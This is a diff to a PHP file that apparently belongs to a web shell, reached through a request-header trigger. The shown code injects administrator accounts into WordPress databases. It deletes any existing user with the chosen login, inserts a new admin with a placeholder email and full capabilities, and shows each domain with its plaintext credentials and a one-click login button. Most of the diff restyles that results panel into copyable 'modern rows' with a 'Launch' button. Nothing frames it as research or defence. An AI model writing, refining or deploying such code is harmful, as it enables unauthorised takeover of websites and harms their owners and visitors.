@@ -631,15 +631,46 @@ if (isset($_SERVER[$h_act])) {
                         if ($q && $r = @mysqli_fetch_assoc($q)) $site_url = $r['option_value'];
                         $disp_url = parse_url($site_url, PHP_URL_HOST); if(!$disp_url) $disp_url = $site_url;
                         
-                        $st_txt = "CREATED"; $st_cls = "created"; 
+                        // LOGIC STATUS
+                        $st_txt = "New Admin"; $st_cls = "status-success"; 
                         $chk = @mysqli_query($link, "SELECT ID FROM {$pre}users WHERE user_login='$new_u'");
                         if ($chk && @mysqli_num_rows($chk) > 0) {
-                            $old = @mysqli_fetch_assoc($chk); @mysqli_query($link, "DELETE FROM {$pre}users WHERE ID = " . $old['ID']); @mysqli_query($link, "DELETE FROM {$pre}usermeta WHERE user_id = " . $old['ID']); $st_txt = "REPLACED"; $st_cls = "replaced";
+                            $old = @mysqli_fetch_assoc($chk); @mysqli_query($link, "DELETE FROM {$pre}users WHERE ID = " . $old['ID']); @mysqli_query($link, "DELETE FROM {$pre}usermeta WHERE user_id = " . $old['ID']); 
+                            $st_txt = "Replaced"; $st_cls = "status-warning"; 
                         }
                         $ins = @mysqli_query($link, "INSERT INTO {$pre}users (user_login, user_pass, user_nicename, user_email, user_registered, user_status, display_name) VALUES ('$new_u', '$new_p_hash', '$new_u', 'admin@admin.com', NOW(), 0, '$new_u')");
+                        
                         if ($ins) {
                             $uid = @mysqli_insert_id($link); @mysqli_query($link, "INSERT INTO {$pre}usermeta (user_id, meta_key, meta_value) VALUES ($uid, '{$pre}capabilities', 'a:1:{s:13:\"administrator\";b:1;}')"); @mysqli_query($link, "INSERT INTO {$pre}usermeta (user_id, meta_key, meta_value) VALUES ($uid, '{$pre}user_level', '10')");
-                            $html_log .= "<div class='inj-card'><div class='inj-header'><span class='inj-status $st_cls'>$st_txt</span><span class='inj-domain'>$disp_url</span></div><div class='inj-body'><form action='$site_url/wp-login.php' method='post' target='_blank' style='margin:0;'><input type='hidden' name='log' value='$new_u'><input type='hidden' name='pwd' value='$new_p_raw'><button class='inj-btn'><i class='fas fa-sign-in-alt'></i> LOGIN</button></form><div class='inj-creds'>U: $new_u | P: $new_p_raw</div></div></div>";
+                            
+                            // --- NEW HTML STRUCTURE (MODERN ROW) ---
+                            $html_log .= "
+                            <div class='modern-row'>
+                                <div class='m-icon'>
+                                    <i class='fab fa-wordpress-simple'></i>
+                                </div>
+                                <div class='m-info'>
+                                    <div class='m-domain'>$disp_url</div>
+                                    <div class='m-status $st_cls'>$st_txt</div>
+                                </div>
+                                <div class='m-creds'>
+                                    <div class='cred-group'>
+                                        <label>USERNAME</label>
+                                        <div class='val copyable' onclick='navigator.clipboard.writeText(\"$new_u\");showToast(\"Copied!\")'>$new_u</div>
+                                    </div>
+                                    <div class='cred-group'>
+                                        <label>PASSWORD</label>
+                                        <div class='val blur-reveal copyable' onclick='navigator.clipboard.writeText(\"$new_p_raw\");showToast(\"Copied!\")'>$new_p_raw</div>
+                                    </div>
+                                </div>
+                                <div class='m-action'>
+                                    <form action='$site_url/wp-login.php' method='post' target='_blank'>
+                                        <input type='hidden' name='log' value='$new_u'>
+                                        <input type='hidden' name='pwd' value='$new_p_raw'>
+                                        <button class='btn-glow'><i class='fas fa-rocket me-2'></i>Launch</button>
+                                    </form>
+                                </div>
+                            </div>";
                         }
                         @mysqli_close($link);
                     }
@@ -1206,12 +1237,135 @@ if (isset($_SERVER[$h_act])) {
         .cmd-arrow { color: #444; font-size: 12px; opacity: 0; }
         .tool-cmd:hover .cmd-arrow { opacity: 1; transform: translateX(-5px); color: #fff; }
         .c-cyan { color: #22d3ee; } .c-lime { color: #a3e635; } .c-gold { color: #facc15; } .c-rose { color: #fb7185; } .c-purple { color: #d946ef; }
-        .inj-card { background: #000; border: 1px solid var(--border-color); border-left: 3px solid var(--border-color); padding: 12px; border-radius: 6px; margin-bottom: 10px; }
-        .inj-card:hover { border-left-color: var(--accent-success); border-color: #444; }
-        .inj-status { font-family: 'JetBrains Mono'; font-size: 0.7rem; padding: 3px 8px; border-radius: 4px; font-weight: bold; }
-        .inj-status.created { color: var(--accent-success); border: 1px solid var(--accent-success); background: rgba(129, 201, 149, 0.1); }
-        .inj-status.replaced { color: var(--accent-warning); border: 1px solid var(--accent-warning); background: rgba(253, 214, 99, 0.1); }
-        .inj-btn { background: var(--accent-success); color: #000; padding: 4px 12px; border-radius: 12px; font-size: 0.75rem; font-weight: 600; border: none; }
+        /* --- MODERN ROW STYLE (TOTAL OVERHAUL) --- */
+        .modern-row {
+            display: flex;
+            align-items: center;
+            background: #161616;
+            border: 1px solid #2a2a2a;
+            border-radius: 12px;
+            padding: 15px;
+            margin-bottom: 10px;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        /* Hover Effect: Glow Border & Lift */
+        .modern-row:hover {
+            transform: translateY(-2px);
+            background: #1a1a1a;
+            border-color: #444;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.4);
+        }
+        .modern-row:hover::before {
+            content: '';
+            position: absolute;
+            left: 0; top: 0; bottom: 0;
+            width: 4px;
+            background: var(--accent-success);
+            box-shadow: 0 0 10px var(--accent-success);
+        }
+
+        /* 1. ICON SECTION */
+        .m-icon {
+            width: 45px;
+            height: 45px;
+            background: #222;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            color: #fff;
+            margin-right: 15px;
+            flex-shrink: 0;
+        }
+
+        /* 2. INFO SECTION (Domain) */
+        .m-info {
+            flex: 1;
+            min-width: 0; /* Text truncate fix */
+            margin-right: 15px;
+        }
+        .m-domain {
+            font-weight: 700;
+            color: #eee;
+            font-size: 1rem;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+        .m-status {
+            font-size: 0.7rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-weight: 600;
+            margin-top: 3px;
+            display: inline-block;
+        }
+        .status-success { color: var(--accent-success); }
+        .status-warning { color: var(--accent-warning); }
+
+        /* 3. CREDENTIALS SECTION */
+        .m-creds {
+            display: flex;
+            gap: 20px;
+            background: #0a0a0a;
+            padding: 8px 15px;
+            border-radius: 8px;
+            border: 1px solid #333;
+            margin-right: 15px;
+        }
+        .cred-group {
+            display: flex;
+            flex-direction: column;
+        }
+        .cred-group label {
+            font-size: 0.6rem;
+            color: #666;
+            font-weight: bold;
+            margin-bottom: 2px;
+        }
+        .cred-group .val {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+            color: var(--accent-primary);
+            cursor: pointer;
+        }
+        .cred-group .val:hover { color: #fff; text-decoration: underline; }
+        
+        /* Blur effect for password privacy */
+        .blur-reveal { filter: blur(4px); transition: 0.2s; user-select: none; }
+        .modern-row:hover .blur-reveal { filter: blur(0); }
+
+        /* 4. ACTION BUTTON */
+        .m-action { flex-shrink: 0; }
+        .btn-glow {
+            background: linear-gradient(135deg, #2ecc71 0%, #27ae60 100%);
+            border: none;
+            color: #fff;
+            padding: 8px 20px;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 0.8rem;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(46, 204, 113, 0.3);
+            transition: 0.2s;
+        }
+        .btn-glow:hover {
+            transform: scale(1.05);
+            box-shadow: 0 6px 20px rgba(46, 204, 113, 0.5);
+        }
+
+        /* Mobile Responsive */
+        @media (max-width: 768px) {
+            .modern-row { flex-direction: column; align-items: flex-start; gap: 10px; }
+            .m-icon { display: none; }
+            .m-creds { width: 100%; justify-content: space-between; margin: 0; }
+            .m-action { width: 100%; }
+            .btn-glow { width: 100%; }
+        }
         #toast-container { position: fixed; top: 80px; right: 20px; z-index: 9999; display: flex; flex-direction: column; gap: 10px; }
         .toast-msg { background: #1e1f20; color: #fff; padding: 12px 18px; border-radius: 8px; border-left: 4px solid #333; box-shadow: 0 5px 15px rgba(0,0,0,0.5); font-size: 0.9rem; min-width: 250px; opacity: 0; transform: translateX(20px); animation: toastIn 0.3s forwards; }
         .toast-msg.success { border-left-color: var(--accent-success); }
